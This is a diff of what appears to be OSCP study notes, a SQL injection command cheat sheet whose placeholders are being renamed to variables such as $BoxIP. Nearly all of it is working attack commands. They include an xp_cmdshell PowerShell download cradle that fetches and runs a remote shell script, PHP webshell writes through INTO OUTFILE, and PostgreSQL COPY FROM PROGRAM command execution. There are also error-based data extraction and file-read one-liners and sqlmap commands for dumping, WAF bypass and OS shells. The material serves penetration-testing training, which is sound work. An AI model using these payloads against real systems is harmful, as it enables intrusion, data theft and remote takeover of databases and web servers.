@@ -8,7 +8,7 @@ Part of [[COMMAND APPENDIX]]. Direct DB client connections plus the full SQL inj
 
 ```bash
 # Connect
-mysql -u root -p'root' -h <target> -P 3306 --skip-ssl-verify-server-cert
+mysql -u root -p'root' -h $BoxIP -P 3306 --skip-ssl-verify-server-cert
 # If TLS errors: --skip-ssl instead
 
 # Once connected
@@ -17,7 +17,7 @@ select system_user();
 show databases;
 use <database>;
 show tables;
-SELECT user, plugin, authentication_string FROM mysql.user WHERE user = '<user>';
+SELECT user, plugin, authentication_string FROM mysql.user WHERE user = '$Username';
 ```
 See [[10. SQL Injection Attacks#10.1.2. DB Types and Characteristics|10.1.2]].
 
@@ -29,7 +29,7 @@ See [[10. SQL Injection Attacks#10.1.2. DB Types and Characteristics|10.1.2]].
 
 ```bash
 # Connect (NTLM auth, not Kerberos)
-impacket-mssqlclient <user>:<pass>@<target> -windows-auth
+impacket-mssqlclient $Username:$Password@$BoxIP -windows-auth
 ```
 ```sql
 SELECT @@version;
@@ -47,12 +47,12 @@ EXECUTE xp_cmdshell '<command>';
 
 **Injecting into an ASP.NET WebForms form** (`.aspx` pages): the `__VIEWSTATE`/`__VIEWSTATEGENERATOR`/`__EVENTVALIDATION` hidden fields have to ride along with every POST, scrape them fresh from the page each time:
 ```bash
-curl -s http://<target>/login.aspx -c /tmp/cookies.txt -o /tmp/login_page.html
+curl -s http://$BoxIP/login.aspx -c /tmp/cookies.txt -o /tmp/login_page.html
 VS=$(grep -oP '(?<=__VIEWSTATE" id="__VIEWSTATE" value=")[^"]*' /tmp/login_page.html)
 VSG=$(grep -oP '(?<=__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value=")[^"]*' /tmp/login_page.html)
 EV=$(grep -oP "(?<=__EVENTVALIDATION\" id=\"__EVENTVALIDATION\" value=\")[^\"]*" /tmp/login_page.html)
 
-curl -s -b /tmp/cookies.txt -X POST http://<target>/login.aspx \
+curl -s -b /tmp/cookies.txt -X POST http://$BoxIP/login.aspx \
   --data-urlencode "__VIEWSTATE=$VS" --data-urlencode "__VIEWSTATEGENERATOR=$VSG" --data-urlencode "__EVENTVALIDATION=$EV" \
   --data-urlencode "ctl00\$ContentPlaceHolder1\$UsernameTextBox=<payload>" \
   --data-urlencode "ctl00\$ContentPlaceHolder1\$PasswordTextBox=test" \
@@ -63,7 +63,7 @@ curl -s -b /tmp/cookies.txt -X POST http://<target>/login.aspx \
 **Blind RCE** (when the app doesn't surface stacked-query errors/results, see [[SQL Injection (Breakdowns)#Why stacked-query errors silently vanish while the query still executes|Command Breakdowns]]): confirm via `WAITFOR DELAY`, then fire a reverse shell blind and confirm via a caught listener instead of reading a return value:
 ```sql
 '; WAITFOR DELAY '0:0:5'--                                          -- confirm stacked queries execute (time the request)
-'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ip>/shell.ps1'')"'-- 
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://$BoxIP/shell.ps1'')"'--
 ```
 *Full quoting breakdown (T-SQL → cmd.exe → PowerShell, three nested layers): [[SQL Injection (Breakdowns)#Triple-nested quoting for xp_cmdshell → cmd.exe → PowerShell download cradle|Command Breakdowns]].*
 
@@ -185,7 +185,7 @@ Nested quote escaping: `''` inside an EXECUTE string = one escaped single quote.
 
 ```bash
 # Connect directly (port 5432 by default)
-psql -h <target> -U <user> -d <database>
+psql -h $BoxIP -U $Username -d <database>
 ```
 ```sql
 SELECT version();
@@ -210,15 +210,15 @@ SELECT string_agg(cmd_output, ' | ') FROM cmd_exec;
 **Full injected one-liners (POST field going into a `LIKE '%<value>%'` clause):**
 ```bash
 # Confirm injection + find column count
-curl -s -X POST --data "field=x'" http://<target>/page.php
-curl -s -X POST --data "field=x%' ORDER BY <N>-- " http://<target>/page.php | grep -iE "error|warning"
+curl -s -X POST --data "field=x'" http://$BoxIP/page.php
+curl -s -X POST --data "field=x%' ORDER BY <N>-- " http://$BoxIP/page.php | grep -iE "error|warning"
 
 # Error-based extraction via CAST() (swap <N> for a column position confirmed integer-typed)
-curl -s -X POST --data "field=x%' UNION SELECT NULL,CAST((<subquery>) AS int),NULL-- " http://<target>/page.php | grep -iE "error|warning"
+curl -s -X POST --data "field=x%' UNION SELECT NULL,CAST((<subquery>) AS int),NULL-- " http://$BoxIP/page.php | grep -iE "error|warning"
 
 # RCE: setup (stacked queries), then read back the output
-curl -s -X POST --data "field=x'; CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '<command>'; -- " http://<target>/page.php
-curl -s -X POST --data "field=x%' UNION SELECT NULL,CAST((SELECT string_agg(cmd_output,' | ')) AS int),NULL FROM cmd_exec-- " http://<target>/page.php | grep -iE "error|warning"
+curl -s -X POST --data "field=x'; CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM '<command>'; -- " http://$BoxIP/page.php
+curl -s -X POST --data "field=x%' UNION SELECT NULL,CAST((SELECT string_agg(cmd_output,' | ')) AS int),NULL FROM cmd_exec-- " http://$BoxIP/page.php | grep -iE "error|warning"
 ```
 *Base64-encode any reverse shell before dropping it into `COPY FROM PROGRAM`, and send it via `--data-urlencode` (not plain `--data`), base64 output routinely contains `+`, which `curl --data` sends raw and gets silently reinterpreted as a space by the receiving server.*
 
@@ -244,8 +244,8 @@ offsec' OR 1=1 -- //
 ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
 
 -- Blind (boolean / time-based)
-<target>?user=offsec' AND 1=1 -- //
-<target>?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+$BoxIP?user=offsec' AND 1=1 -- //
+$BoxIP?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 
 -- MySQL webshell write via UNION + INTO OUTFILE
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
@@ -256,8 +256,8 @@ offsec' OR 1=1 -- //
 ' UNION SELECT "","<?=`\$_GET[0]`?>","","" INTO OUTFILE "/var/www/html/shell.php" -- //
 
 -- Finding the web root to target with INTO OUTFILE (read web server config via LOAD_FILE):
--- Nginx:  LOAD_FILE("/etc/nginx/sites-enabled/default")  → look for "root <path>;"
--- Apache: LOAD_FILE("/etc/apache2/sites-enabled/000-default.conf")  → look for "DocumentRoot <path>"
+-- Nginx:  LOAD_FILE("/etc/nginx/sites-enabled/default")  → look for "root $BoxDir;"
+-- Apache: LOAD_FILE("/etc/apache2/sites-enabled/000-default.conf")  → look for "DocumentRoot $BoxDir"
 -- Also try: LOAD_FILE("/var/www/html/index.php") or LOAD_FILE("/var/www/html/config.php")
 --           to find PHP includes and config files (DB creds often live in config.php)
 
@@ -292,28 +292,28 @@ offsec' OR 1=1 -- //
 **Full `curl` one-liners for a POST-based error-based extraction** (no sqlmap, manual only, one field goes straight into an `INSERT`):
 ```bash
 # Confirm the injection (single quote breaks the query, error text comes back in the response)
-curl -X POST --data "mail-list=test'" http://<target>/index.php
+curl -X POST --data "mail-list=test'" http://$BoxIP/index.php
 
 # Version, current DB, tables, columns, in that order
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -" http://<target>/index.php | grep -i "XPATH"
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -" http://<target>/index.php | grep -i "XPATH"
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -" http://<target>/index.php | grep -i "XPATH"
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<table>')))-- -" http://<target>/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -" http://$BoxIP/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -" http://$BoxIP/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -" http://$BoxIP/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<table>')))-- -" http://$BoxIP/index.php | grep -i "XPATH"
 
 # Dump one row at a time with LIMIT (keeps each extractvalue() result short enough to read whole)
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT concat(<col1>,0x7c,<col2>) FROM <table> LIMIT 0,1)))-- -" http://<target>/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT concat(<col1>,0x7c,<col2>) FROM <table> LIMIT 0,1)))-- -" http://$BoxIP/index.php | grep -i "XPATH"
 for i in 1 2 3 4 5; do
-  curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT concat(<col1>,0x7c,<col2>) FROM <table> LIMIT $i,1)))-- -" http://<target>/index.php | grep -i "XPATH"
+  curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT concat(<col1>,0x7c,<col2>) FROM <table> LIMIT $i,1)))-- -" http://$BoxIP/index.php | grep -i "XPATH"
 done
 
 # Privilege/config checks before trying a file read
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT current_user())))-- -" http://<target>/index.php | grep -i "XPATH"
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT privilege_type FROM information_schema.user_privileges WHERE grantee LIKE '%<user>%')))-- -" http://<target>/index.php | grep -i "XPATH"
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT @@secure_file_priv)))-- -" http://<target>/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT current_user())))-- -" http://$BoxIP/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT privilege_type FROM information_schema.user_privileges WHERE grantee LIKE '%$Username%')))-- -" http://$BoxIP/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT @@secure_file_priv)))-- -" http://$BoxIP/index.php | grep -i "XPATH"
 
 # Read a file, paged 31 characters at a time (increment the start offset by 31 each call)
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),1,31)))-- -" http://<target>/index.php | grep -i "XPATH"
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),32,31)))-- -" http://<target>/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),1,31)))-- -" http://$BoxIP/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/path/to/file')),32,31)))-- -" http://$BoxIP/index.php | grep -i "XPATH"
 ```
 *Swap `mail-list`/`index.php` for whatever field/page the target form actually uses (check the `<form method="...">` and `name="..."` attributes first, same lookup as [[10. SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2's Step 0]]). The `grep -i "XPATH"` just filters the huge HTML response down to the one line containing the leaked error.*
 
@@ -329,23 +329,23 @@ See [[10. SQL Injection Attacks#10.2. Manual SQL Exploitation|10.2]], [[10. SQL 
 
 ```bash
 # Discovery/fingerprint
-sqlmap -u "http://<target>/page.php?id=1" -p id
+sqlmap -u "http://$BoxIP/page.php?id=1" -p id
 
 # POST-based form instead of a GET parameter (check the page's <form method="..."> first)
-sqlmap -u "http://<target>/page.php" --data="field=test" -p field --batch
+sqlmap -u "http://$BoxIP/page.php" --data="field=test" -p field --batch
 
 # Dump the current database
-sqlmap -u "http://<target>/page.php?id=1" -p id --dump
+sqlmap -u "http://$BoxIP/page.php?id=1" -p id --dump
 
 # Force one specific technique, then dump one specific table
-sqlmap -u "http://<target>/page.php?id=1" -p id --technique=T -T users --dump
+sqlmap -u "http://$BoxIP/page.php?id=1" -p id --technique=T -T users --dump
 
 # Full interactive OS shell (capture a POST request via Burp first, save as post.txt)
 sqlmap -r post.txt -p <param> --os-shell --web-root "/var/www/html/tmp"
 
 # Target keeps answering with a non-2xx status even on valid requests (e.g. a WP AJAX
 # handler that always replies 404), sqlmap otherwise bails out treating it as unreachable
-sqlmap -u "http://<target>/wp-admin/admin-ajax.php?action=<name>&id=1" -p id --batch --ignore-code=404
+sqlmap -u "http://$BoxIP/wp-admin/admin-ajax.php?action=<name>&id=1" -p id --batch --ignore-code=404
 ```
 *`--technique=` letters: `B`=boolean-blind, `E`=error-based, `U`=union, `S`=stacked queries, `T`=time-blind, `Q`=inline queries. Useful when sqlmap finds several techniques but the one you actually want (or the fastest one) isn't the default it picks.*
 
@@ -360,13 +360,13 @@ See [[10. SQL Injection Attacks#10.3.2. Automating the Attack|10.3.2]] and [[10.
 # Use in URLs, cookie headers, custom headers — anywhere the param isn't a standard GET/POST field
 
 # Cookie header injection
-sqlmap -u 'http://<target>/page.php' -H 'Cookie: id=*' --batch --dump
+sqlmap -u 'http://$BoxIP/page.php' -H 'Cookie: id=*' --batch --dump
 
 # URL injection at a specific position (not the last param)
-sqlmap -u 'http://<target>/page.php?id=*&other=value' --batch --dump
+sqlmap -u 'http://$BoxIP/page.php?id=*&other=value' --batch --dump
 
 # Custom header injection (e.g. X-Forwarded-For)
-sqlmap -u 'http://<target>/page.php' -H 'X-Forwarded-For: *' --batch
+sqlmap -u 'http://$BoxIP/page.php' -H 'X-Forwarded-For: *' --batch
 
 # JSON body injection — save full HTTP request to a file (Burp: right-click → Save item)
 # sqlmap auto-detects JSON content type and tests the values inside
@@ -379,15 +379,15 @@ sqlmap -r request.req --batch --dump
 # --level and --risk: push harder when default detection misses the injection
 # Default: --level 1 --risk 1
 # Max:     --level 5 --risk 3 (--risk 3 adds OR-based payloads that can modify data — avoid on production)
-sqlmap -u 'http://<target>/page.php?id=*' --level 5 --risk 3 --batch --dump
+sqlmap -u 'http://$BoxIP/page.php?id=*' --level 5 --risk 3 --batch --dump
 
 # --prefix: close a non-standard bracket/function wrapping before the injection payload
 # Use when a single quote causes an error but standard payloads still fail
 # (inspect the error message to figure out what structure precedes your input)
-sqlmap -u 'http://<target>/page.php?col=id' --prefix='`)' --batch --dump
+sqlmap -u 'http://$BoxIP/page.php?col=id' --prefix='`)' --batch --dump
 
 # --union-cols: tell sqlmap the exact column count when auto-detection gets it wrong
-sqlmap -u 'http://<target>/page.php?id=1' --technique=U --union-cols=5 --batch --dump
+sqlmap -u 'http://$BoxIP/page.php?id=1' --technique=U --union-cols=5 --batch --dump
 # --union-char=a          use 'a' instead of NULL for filler columns
 # --union-from=<table>    use a different FROM clause (if FROM DUAL causes errors)
 ```
@@ -397,24 +397,24 @@ sqlmap -u 'http://<target>/page.php?id=1' --technique=U --union-cols=5 --batch -
 ```bash
 # --random-agent: rotate User-Agent string per request (pulls from real-browser UA database)
 # Cheap, should be default for any WAF-protected target
-sqlmap -u 'http://<target>/page.php?id=1' --random-agent --batch --dump
+sqlmap -u 'http://$BoxIP/page.php?id=1' --random-agent --batch --dump
 
 # --csrf-token: auto-refresh an anti-CSRF token before each request
 # Include the current token value in --data; sqlmap re-fetches and substitutes it automatically
-sqlmap -u 'http://<target>/form.php' \
+sqlmap -u 'http://$BoxIP/form.php' \
        --data 'id=1&csrf_token=<current_token_value>' \
        --csrf-token=csrf_token \
        --batch --dump
 
 # --randomize: generate a fresh random value for a specific parameter each request
 # Use when the app rejects repeated values (e.g. a transaction UID that must be unique per call)
-sqlmap -u 'http://<target>/page.php?id=1&uid=<current_value>' --randomize=uid --batch --dump
+sqlmap -u 'http://$BoxIP/page.php?id=1&uid=<current_value>' --randomize=uid --batch --dump
 
 # --tamper: post-process payloads through a Python script to bypass keyword/character filters
-sqlmap -u 'http://<target>/page.php?id=1' --tamper=between --batch --dump
+sqlmap -u 'http://$BoxIP/page.php?id=1' --tamper=between --batch --dump
 
 # Chaining tamper scripts
-sqlmap -u 'http://<target>/page.php?id=1' --tamper=between,space2comment,randomcase --batch --dump
+sqlmap -u 'http://$BoxIP/page.php?id=1' --tamper=between,space2comment,randomcase --batch --dump
 
 # List all available tamper scripts
 ls /usr/share/sqlmap/tamper/
@@ -434,23 +434,23 @@ ls /usr/share/sqlmap/tamper/
 
 ```bash
 # Target a specific database and table (critical for time-based blind — don't dump everything)
-sqlmap -u 'http://<target>/page.php?id=1' -D <dbname> -T <tablename> --batch --dump
+sqlmap -u 'http://$BoxIP/page.php?id=1' -D <dbname> -T <tablename> --batch --dump
 
 # Enumerate databases, then tables, then columns before dumping
-sqlmap -u 'http://<target>/page.php?id=1' --dbs --batch
-sqlmap -u 'http://<target>/page.php?id=1' -D <dbname> --tables --batch
-sqlmap -u 'http://<target>/page.php?id=1' -D <dbname> -T <tablename> --columns --batch
+sqlmap -u 'http://$BoxIP/page.php?id=1' --dbs --batch
+sqlmap -u 'http://$BoxIP/page.php?id=1' -D <dbname> --tables --batch
+sqlmap -u 'http://$BoxIP/page.php?id=1' -D <dbname> -T <tablename> --columns --batch
 
 # Search for columns/tables/databases by keyword (searches across all accessible databases)
-sqlmap -u 'http://<target>/page.php?id=1' --search -C <keyword>   # search column names
-sqlmap -u 'http://<target>/page.php?id=1' --search -T <keyword>   # search table names
-sqlmap -u 'http://<target>/page.php?id=1' --search -D <keyword>   # search database names
+sqlmap -u 'http://$BoxIP/page.php?id=1' --search -C <keyword>   # search column names
+sqlmap -u 'http://$BoxIP/page.php?id=1' --search -T <keyword>   # search table names
+sqlmap -u 'http://$BoxIP/page.php?id=1' --search -D <keyword>   # search database names
 ```
 
 **sqlmap output directory**, all dumps and file reads are saved to:
 ```
-~/.local/share/sqlmap/output/<target_host>/dump/<dbname>/<tablename>.csv
-~/.local/share/sqlmap/output/<target_host>/files/_var_www_html_flag.txt  (/ replaced with _)
+~/.local/share/sqlmap/output/$BoxIP/dump/<dbname>/<tablename>.csv
+~/.local/share/sqlmap/output/$BoxIP/files/_var_www_html_flag.txt  (/ replaced with _)
 ```
 Check this directory when dump content doesn't appear in the terminal. Use `ls ~/.local/share/sqlmap/output/` to see what's been captured.
 
@@ -458,14 +458,14 @@ Check this directory when dump content doesn't appear in the terminal. Use `ls ~
 
 ```bash
 # Read an arbitrary file (requires FILE privilege and secure_file_priv='' or matching path)
-sqlmap -u "http://<target>/page.php?id=1" --file-read "/var/www/html/flag.txt" --batch
+sqlmap -u "http://$BoxIP/page.php?id=1" --file-read "/var/www/html/flag.txt" --batch
 # Output saved to: ~/.local/share/sqlmap/output/<host>/files/_var_www_html_flag.txt
 
 # OS shell — error-based is faster than time-blind for the file-write upload
 # --technique=E avoids waiting for SLEEP() delays during the stager write
-sqlmap -u 'http://<target>/page.php?id=1' --os-shell --technique=E --batch
+sqlmap -u 'http://$BoxIP/page.php?id=1' --os-shell --technique=E --batch
 # If it can't find a writable web root automatically:
-sqlmap -u 'http://<target>/page.php?id=1' --os-shell --technique=E --web-root "/var/www/html" --batch
+sqlmap -u 'http://$BoxIP/page.php?id=1' --os-shell --technique=E --web-root "/var/www/html" --batch
 ```
 
 #### Tags: #Sqlmap #CookieInjection #JSONInjection #WAFBypass #CSRFToken #Tamper #RandomAgent #FileRead #OSShell #AdvancedSqlmap
@@ -481,3 +481,14 @@ This area grows alongside the modules. Whenever a new DB engine or SQLi variant 
 - [RevShells](https://www.revshells.com/) for shell payload selection
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for technique walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/10. SQL Injection Attacks]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- demonstrates the workflow described here
